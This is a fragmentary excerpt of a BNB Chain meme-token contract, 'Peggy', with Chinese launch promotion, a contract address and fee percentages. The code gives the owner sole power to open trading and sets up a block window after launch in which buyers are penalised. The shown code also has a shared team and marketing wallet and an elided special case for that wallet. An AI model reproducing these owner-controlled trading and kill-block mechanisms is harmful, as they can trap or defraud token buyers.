...
// 🍅锁池:1年
// 🥦底池:5BNB公平发射
// 开盘时间:2022年9月18号08:00（9.18 12:00UTC）
// 群组：@PeGgyDoGE
// 合约：0x71DD8774405Fd83e03167e7179F7183578cD17E3💎Peggy（佩吉狗）
// 💸流动:100%
// 🍐回流:1%
// 🍋营销:1%
// 🕳 团队:1%
...
// 开盘时间:2022年9月18号08:00（9.18 12:00UTC）
// 群组：@PeGgyDoGE
// 合约：0x71DD8774405Fd83e03167e7179F7183578cD17E3
...
interface IAntiBot {
    function antiBotKill(bool isKilled) external;
    function getAntiBotEnable() external view returns(bool);
}
...
contract Peggy is Context, IERC20, Ownable {
    ...
    string private _name = "Peggy";
    string private _symbol = "Peggy";
    uint8 private _decimals = 9;

    IAntiBot private _antiBot;
    address payable public marketingWalletAddress = payable(0xD14fAC474a432C2AB4CecEB61C2f2cAf2b0b0aED); 
    address payable public teamWalletAddress = payable(0xD14fAC474a432C2AB4CecEB61C2f2cAf2b0b0aED); 
    ...
    uint256 public kaifangBlock;
    uint256 public killQukuaAmounti;
    bool    public jiaoyiBool = false;
    ...
    function JYKaiguan(uint256 qukuaiAmount) public onlyOwner {
        killQukuaAmounti = qukuaiAmount;
        jiaoyiBool = true;
        kaifangBlock = block.number;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            if (sender == teamWalletAddress && recipient == teamWalletAddress) {
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                require ( /* Kaifangjiaoyi */ jiaoyiBool);
                if (block.number <= kaifangBlock + killQukuaAmounti) {killBlock(recipient);}
